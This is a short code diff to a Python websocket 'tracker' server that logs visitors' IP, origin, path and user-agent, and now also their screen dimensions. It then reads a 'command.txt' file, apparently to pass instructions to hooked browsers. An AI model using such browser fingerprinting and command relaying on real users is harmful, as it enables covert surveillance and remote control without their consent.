@@ -15,13 +15,18 @@ async def tracker(websocket, path):
         ip = wData['ip']
         ip = ip.rstrip()
         path = wData['loc']
+        h = str(wData['h'])
+        w = str(wData['w'])
         print("---NEW CONNECTION---")
         print("[+]Connection from: ",ip)
         print("[+]Origin: ", websocket.request_headers.get('origin'))
         print("[+]Path: ", path)
         print("[+]User-Agent: ", websocket.request_headers.get('user-agent'))
+        print("[+]Screen Dimmensions: ",w,"x",h)
         print("---END CONNECTION---")
-        data = "Host: "+ip+"\tOrigin: "+websocket.request_headers.get('origin')+"\tUser-Agent: "+websocket.request_headers.get('user-agent')+"\tPath: "+path
+        data = "Host: "+ip+"\tOrigin: "+websocket.request_headers.get('origin')+"\tUser-Agent: "\
+            +websocket.request_headers.get('user-agent')+"\tPath: "+path+\
+            "\tHeight: "+h+"\tWidth: "+w
         logging.info(data)
         insData = open('command.txt','r')
         instruction = insData.read()
